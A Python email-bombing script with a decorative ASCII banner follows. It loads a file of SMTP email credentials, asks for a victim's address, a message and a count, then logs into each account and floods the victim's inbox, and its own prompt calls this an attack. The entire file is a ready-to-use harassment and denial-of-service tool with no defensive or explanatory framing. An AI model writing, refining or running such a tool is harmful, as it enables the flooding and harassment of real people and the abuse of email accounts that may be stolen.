import smtplib

print ("\033[1;31m_________    __        __        ____        ________    __                                             \033[1;m")
print ("\033[1;34m|########|  |##\      /##|      /####\      |########|  |##|              By amex2189 With @erfan4lx                 \033[1;m")
print ("\033[1;34m|##|____    |###\ __ /###|     /##/\##\        |##|     |##|                 \033[1;m")
print ("\033[1;34m|########|  |##| |##| |##|    /########\       |##|     |##|         ____   __       ____   __  ___     \033[1;m")
print ("\033[1;31m|##|_____   |##|      |##|   /##/    \##\    __|##|__   |##|_______   |__| |  | |\/|  |__| |__  |__|    \033[1;m")
print ("\033[1;31m|########|  |##|      |##|  /##/      \##\  |########|  |##########| _|__| |__| |  | _|__| |__  |  \    \033[1;m")

mails = []
passwords = []
hosts = []
ports = []

f0 = open("Data.txt", "r").read()
f0 = f0.split()

for line in f0:
    datas = line.split(":")
    mails.append(datas[0])
    passwords.append(datas[2])
    hosts.append(datas[1])
    ports.append(datas[3])

f1 = mails
f2 = passwords
f3 = hosts
f4 = ports

if int(len(f1)) == int(len(f2)) and int(len(f3)) == int(len(f4)):
    pass
else:
    print("Error !")

print("")
bomb_email = input("Enter Email address on Whom you want to perform this attack: ")
message = input("Enter message: ")
counter = int(input("How many message you want to send per your mail: "))
print("")

try:
    def erfan(email,password,host,port):
        mail = smtplib.SMTP(str(host),int(port))
        mail.ehlo()
        mail.starttls()
        mail.login(str(email),str(password))
        for j in range(0, counter):
            mail.sendmail(str(email),str(bomb_email),str(message))
        print("Number of Message sent: %s by: %s" % (str(j+1),str(email)))
        mail.close()
except Exception as e:
    print("Something is wrong, please Re-try Again with Valid input: "+str(e))

x = 0

for i in range(0, len(f1)):
    erfan(f1[x],f2[x],f3[x],f4[x])
    x += 1
print("")
